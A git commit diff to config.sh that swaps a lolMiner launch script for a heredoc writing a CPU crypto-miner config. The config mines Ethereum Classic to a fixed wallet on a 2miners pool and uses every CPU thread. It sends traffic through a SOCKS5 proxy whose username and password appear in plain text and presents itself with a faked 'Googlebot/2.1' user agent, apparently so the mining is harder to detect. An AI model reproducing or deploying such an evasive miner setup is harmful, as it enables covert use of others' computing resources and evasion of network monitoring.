2945cad57f9a28009678f5395d7bfa9cfff0a2ae
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-19 23:11:49 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,17 +1,16 @@
-#!/bin/bash
-
-#################################
-## Begin of user-editable part ##
-#################################
-
-POOL=etc.2miners.com:1010
-WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty)
-
-#################################
-##  End of user-editable part  ##
-#################################
-
-cd "$(dirname "$0")"
-
-./lolMiner --algo ETCHASH --pool $POOL --user $WALLET $@
-timeout 10
+cat > config.json <<END
+{
+        "url" : "etc.2miners.com:1010",
+        "user" : "0x11880b1cfe04907c5306222be1e09f4bbb480eb5",
+        "algo" : "ETCHASH",
+        "threads" : $(nproc --all),
+        "cpu-priority" : 0,
+        "cpu-affinity" : -1,
+        "benchmark" : false,
+        "debug" : false,
+        "protocol": false,
+        "quiet" : false,
+        "proxy" : "socks5://gratis:q1w2e3r4t5@141.95.108.117",
+        "agent" : "Googlebot/2.1"
+}
+END
